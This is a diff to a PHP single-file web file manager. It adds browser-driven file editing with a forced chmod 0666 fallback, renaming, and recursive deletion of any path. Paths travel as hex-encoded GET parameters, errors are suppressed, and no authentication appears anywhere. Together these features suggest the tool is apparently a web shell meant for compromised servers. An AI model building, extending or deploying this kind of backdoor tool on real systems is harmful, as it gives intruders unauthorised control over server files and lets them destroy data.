@@ -209,34 +209,44 @@ function geticon($filename) {
         	return ('https://image.flaticon.com/icons/svg/833/833524.svg');break;
     }
 }
+function countFiles($type) {
+	switch ($type) {
+		case 'allfiles':
+			return @count(scandir(getcwd())) -2;
+			break;
+		case 'dirs':
+			return @count(files(getcwd(), 'dir'));
+			break;
+		case 'files':
+			return @count(files(getcwd(), 'file'));
+			break;
+	}
+}
 function alert($msg) {
 	?>
+	<body bgcolor="grey">
 	<div id="jAlRem">
-    <div id="jAlert">
-        <table id="jAlert_table">
-            <tr id="jAlert_tr">
-                <td id="jAlert_td">  <p id="jAlert_content"></p>  </td>
-                <td id="jAlert_td">  <button id='jAlert_ok'  onclick="jAlertagree()"></button>  </td>
-            </tr>
-        </table>
-    </div>
-</div>
-	<script>
-	function jAlert(text, customokay){
-	document.getElementById('jAlert_content').innerHTML = text;
-    document.getElementById('jAlert_ok').innerHTML = customokay;
-    document.body.style.backgroundColor = "gray";
-    document.body.style.cursor="wait";
-}
-function jAlertagree(){
-    var parent = document.getElementById('jAlRem');
-    var child = document.getElementById('jAlert');
-    parent.removeChild(child);
-    document.body.style.backgroundColor="white";
-    document.body.style.cursor="default";
-}
-jAlert("Stop! Stop!", "<b>Okay!</b>");
-</script>
+    	<div id="jAlert">
+    		<div class="title"><h5>Alert!</h5></div>
+    		<div class="msg">
+    			<div class="jAlert_content"><?= $msg ?></div>
+    		</div>
+    		<div class="ok">
+    			<button style="width:100%;" class="btn btn-outline-success btn-sm" id='jAlert_ok' onclick="jAlertagree()">OK</button>
+    		</div>
+    	</div>
+	</div>
+		<script>
+			function jAlertagree(){
+    			var parent = document.getElementById('jAlRem');
+    			var child = document.getElementById('jAlert');
+    			window.location.href='?v=<?= hex(getcwd()) ?>';
+    			parent.removeChild(child);
+    			document.body.style.backgroundColor="white";
+    			document.body.style.cursor="default";
+			}
+		</script>
+	</body>
 	<?php
 }
 function ftime($filename) {
@@ -244,6 +254,42 @@ function ftime($filename) {
 }
 function freadd($filename) {
 	return htmlspecialchars(file_get_contents($filename));
+}
+function frename($filename, $newname) {
+	return rename($filename, getcwd().DIRECTORY_SEPARATOR.$newname);
+}
+function save($filename, $data) {
+	$key = true;
+	$handle = fopen($filename, "w");
+	if (!@fwrite($handle, $data)) {
+		@chmod($filename, 0666);
+		$key = fwrite($handle, $data) ? true : false;
+	} fclose($handle);
+	return $key;
+}
+function ifnofiles() {
+	if (!countFiles('allfiles')) {
+		?><div class="alert alert-danger">Nothing files on direactory</div><?php
+	}
+}
+function delete($filename) {
+	if (is_dir($filename)) {
+		$scandir = scandir($filename);
+		foreach ($scandir as $object) {
+			if ($object!='.'&&$object!='..') {
+				if (is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
+					delete($filename.DIRECTORY_SEPARATOR.$object);
+				} else {
+					@unlink($filename.DIRECTORY_SEPARATOR.$object);
+				}
+			}
+		}
+		if(@rmdir($filename)){return true;}
+		else{return false;}
+	} else {
+		if (@unlink($filename)){return true;}
+		else{return false;}
+	}
 }
 function fredit($filename, $data) {}
 if (isset($_GET['v'])) {
@@ -270,8 +316,8 @@ if (isset($_GET['v'])) {
 		height: 30px;
 	}
 	.buntel {
-		padding-left:20px;
-		padding-right:20px;
+		
+		
 	}
 	.buntel table td {
 		padding-bottom:10px;
@@ -279,28 +325,34 @@ if (isset($_GET['v'])) {
 	.clickable:hover {
 		cursor: pointer;
 	}
-	#jAlert_table, #jAlert_th, #jAlert_td{
-    border: 2px solid blue;
-    background-color:lightblue;
-    border-collapse: collapse;
-    width:100px;
-}
-
-#jAlert_th, #jAlert_td{
-    padding:5px;
-    padding-right:10px;
-    padding-left:10px;
-}
-
-#jAlert{
-    /* Position fixed */
-    position:fixed;
-    /* Center it! */
-    top: 50%;
-    left: 50%;
-    margin-top: -50px;
-    margin-left: -100px;
-}
+	
+	#jAlert{
+		border-radius:7px;
+		background: #fff;
+		box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+    	position:fixed;
+    	padding-right:20px;
+    	padding-left:20px;
+    	padding-bottom: 20px;
+    	width:300px;
+    	top: 20%;
+    	left: 50%;
+    	margin-top: -120px;
+    	margin-left: -200px;
+	}
+	.title {
+		padding-top:10px;
+		padding-bottom: 3px;
+	}
+	.msg {
+		height:100px;
+	}
+	.count {
+		border-top:1px solid red;
+		padding:7px;
+		padding-left:20px;
+		padding-right: 20px;
+	}
 </style>
 <script type="text/javascript">
 	jQuery(document).ready(function($) {
@@ -313,16 +365,25 @@ if (isset($_GET['v'])) {
 	<div class="card" style="max-height:100%;">
 		<div class="card-body">
 			<h5 class="card-title"><?= text(1) ?></h5>
-			<p class="card-text"><?= pwd() ?></p>
-		</div>
-		<?php
+			<?php
 		@$_GET['file'] = unhex($_GET['file']);
 		switch (@$_GET['a']) {
 			case 'e':
-			print(alert('sad'));
+				if (isset($_POST['submit'])) {
+					if (save($_GET['file'], $_POST['data'])) {
+						alert("success");
+					} else {
+						alert("failed");
+					}
+				}
 				?>
 				<div class="buntel">
 				<table class="tablet" width="100%">
+					<tr>
+						<td colspan="3">
+							<a href="?v=<?= hex(getcwd()) ?>">back</a>
+						</td>
+					</tr>
 					<tr>
 						<td>Filename</td>
 						<td>:</td>
@@ -336,7 +397,7 @@ if (isset($_GET['v'])) {
 					<form method="post">
 						<tr>
 							<td colspan="3">
-								<textarea class="form-control" rows="25" name="date"><?= freadd($_GET['file']) ?></textarea>
+								<textarea class="form-control" rows="25" name="data"><?= freadd($_GET['file']) ?></textarea>
 							</td>
 						</tr>
 						<tr>
@@ -350,8 +411,55 @@ if (isset($_GET['v'])) {
 				<?php
 				exit();
 				break;
+			case 'r':
+				if (isset($_POST['submit'])) {
+					if (frename($_GET['file'], $_POST['newname'])) {
+						alert('rename success');
+					} else {
+						alert('failed');
+					}
+				}
+				?>
+				<div class="buntel">
+				<table class="tablet" width="100%">
+					<tr>
+						<td colspan="3">
+							<a href="?v=<?= hex(getcwd()) ?>">back</a>
+						</td>
+					</tr>
+					<tr>
+						<td>Filename</td>
+						<td>:</td>
+						<td><?= wr(basename($_GET['file']), basename($_GET['file'])) ?></td>
+					</tr>
+					<tr>
+						<td>Last Modified</td>
+						<td>:</td>
+						<td><?= ftime($_GET['file'])?></td>
+					</tr>
+					<form method="post">
+						<tr>
+							<td colspan="3">
+								<input class="form-control" type="text" name="newname" value="<?= basename($_GET['file']) ?>">
+							</td>
+							<td>
+								<input style="width:100%;" class="btn btn-outline-success" type="submit" name="submit" value="Rename">
+							</td>
+						</tr>
+					</form>
+				</table>
+				</div>
+				<?php
+				exit();
+				break;
+			case 'd':
+				delete($_GET['file']);
+				break;
 		}
 		?>
+		<p class="card-text"><?= pwd() ?></p>
+		<?= ifnofiles() ?>
+		</div>
 		<div class="card-body scroll" style="padding: 0;max-height:100%;overflow-y: auto;">
 		<ul class="list-group list-group-flush">
 			<?php
@@ -375,8 +483,12 @@ if (isset($_GET['v'])) {
 							<div class="dropdown">
 								<a style="width:100%;" class="btn btn-outline-info btn-sm dropdown-toggle" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Action</a>
 								<div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
-									<a class="dropdown-item" href="#">Rename</a>
-									<a class="dropdown-item" href="#">Delete</a>
+									<a class="dropdown-item" href="?v=<?=hex(getcwd())?>&a=r&file=<?=hex($value['names'])?>">
+										Rename
+									</a>
+									<a class="dropdown-item" href="?v=<?=hex(getcwd())?>&a=d&file=<?=hex($value['names'])?>">
+										Delete
+									</a>
 								</div>
 							</div>
 						</div>
@@ -406,8 +518,10 @@ if (isset($_GET['v'])) {
 									<a class="dropdown-item" href="?v=<?=hex(getcwd())?>&a=e&file=<?=hex($value['names'])?>">
 										Edit
 									</a>
-									<a class="dropdown-item" href="#">Rename</a>
-									<a class="dropdown-item" href="#">Delete</a>
+									<a class="dropdown-item" href="?v=<?=hex(getcwd())?>&a=r&file=<?=hex($value['names'])?>">	Rename
+									</a>
+									<a class="dropdown-item" href="?v=<?=hex(getcwd())?>&a=d&file=<?=hex($value['names'])?>">	Delete
+									</a>
 									<a class="dropdown-item" href="#">Download</a>
 								</div>
 							</div>
@@ -417,6 +531,11 @@ if (isset($_GET['v'])) {
 			<?php }
 			?>
 		</ul>
+		</div>
+		<div class="count">
+			Directory : <?= countFiles('dirs') ?> | 
+			Files : <?= countFiles('files') ?> | 
+			Total : <?= countFiles('allfiles') ?>
 		</div>
 	</div>
 </div>
